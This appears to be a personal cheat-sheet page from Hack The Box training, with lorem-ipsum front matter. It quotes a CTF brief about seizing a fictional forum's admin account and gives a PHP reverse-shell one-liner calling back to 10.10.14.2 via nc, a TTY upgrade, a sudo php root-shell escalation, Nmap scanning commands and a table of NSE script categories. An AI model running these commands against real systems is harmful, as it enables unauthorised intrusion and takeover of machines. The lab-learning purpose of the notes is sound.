---
title: Super cool article that I wrote(duplicate)
summary: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean in
  eleifend justo, vestibulum congue lacus. Quisque est libero, lacinia sed
  placerat ac, interdum id urna.
categories:
  - Post
tags:
  - Blog
  - post
  - lorem
  - ipsum
date: 2025-06-17T21:47:00.000Z
draft: false
---



Volnaya Forums

"The Volnaya Forumxss stand as a sprawling network where citizens compete to outdo each other in public displays of loyalty. Every post and reply is carefully monitored, and the most zealous praise is rewarded with higher loyalty scores. Behind the scenes, a small cadre of administrators wields absolute control, silencing dissent and shaping the narrative to serve the regime’s ambitions. Task Force Phoenix has identified the forum’s admin account as a critical target. Gaining access would allow the task force to disrupt the flow of propaganda and strike a blow against the regime’s information control. Recently, we managed to secure a backup copy of the forum server from an unsecured FTP server. Can you analyze the platform’s architecture and code to uncover any weaknesses that might grant us access to the admin account?"


### Remote code execution
**PHP code**

```
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

**Upgrading shell to TTY**

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Privilege Escalation via PHP

You can spawn a root shell like this:

`sudo /usr/bin/php -r 'system("/bin/bash");'`


## Way Forward


- [ ]  Root a Retired Easy Box  
    
- [ ]  Root a Retired Medium Box  
    
- [ ]  Root an Active Box  
    
- [ ]  Complete an Easy Challenge  
    
- [ ]  Share a Walkthrough of a Retired Box  
    
- [ ]  Complete Offensive Academy Modules  
    
- [ ]  Root Live Medium/Hard Boxes  
    
- [ ]  Complete A Track  
    
- [ ]  Win a `Hack The Box Battlegrounds` Battle  
    
- [ ]  Complete A Pro Lab


# Host Discovery Using Nmap

```
sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
```

## Nmap Banner Grabbing

```
nmap 10.129.96.46 -p 22,80,110,139,143,445,31337 -sV -Pn -n --disable-arp-ping --packet-trace
```

# Nmap Scripting Engine

---

Nmap Scripting Engine (`NSE`) is another handy feature of `Nmap`. It provides us with the possibility to create scripts in Lua for interaction with certain services. There are a total of 14 categories into which these scripts can be divided:

| **Category** | **Description**                                                                                                                         |
| ------------ | --------------------------------------------------------------------------------------------------------------------------------------- |
| `auth`       | Determination of authentication credentials.                                                                                            |
| `broadcast`  | Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans. |
| `brute`      | Executes scripts that try to log in to the respective service by brute-forcing with credentials.                                        |
| `default`    | Default scripts executed by using the `-sC` option.                                                                                     |
| `discovery`  | Evaluation of accessible services.                                                                                                      |
| `dos`        | These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.              |
| `exploit`    | This category of scripts tries to exploit known vulnerabilities for the scanned port.                                                   |
| `external`   | Scripts that use external services for further processing.                                                                              |
| `fuzzer`     | This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.     |
| `intrusive`  | Intrusive scripts that could negatively affect the target system.                                                                       |
| `malware`    | Checks if some malware infects the target system.                                                                                       |
| `safe`       | Defensive scripts that do not perform intrusive and destructive access.                                                                 |
| `version`    | Extension for service detection.                                                                                                        |
| `vuln`       | Identification of specific vulnerabilities.                                                                                             |
